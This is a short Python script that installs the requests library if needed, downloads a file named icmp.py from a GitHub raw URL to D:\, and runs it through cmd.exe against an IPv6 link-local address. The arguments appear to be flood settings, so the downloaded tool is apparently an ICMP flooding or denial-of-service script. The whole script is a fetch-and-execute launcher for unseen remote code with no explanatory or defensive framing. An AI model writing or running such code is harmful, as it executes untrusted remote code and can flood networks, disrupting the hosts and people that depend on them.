import os
try:
    import requests
except:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests
    
with open('D:\\icmp.py','wb') as f:
    f.write(requests.get('https://raw.githubusercontent.com/Hex1629/pretest/refs/heads/main/icmp.py').content)

os.system('cmd.exe /k python D:\\icmp.py fe80::f24f:a5a0:fe71:efbb 1200 25000 ERQ 250000')
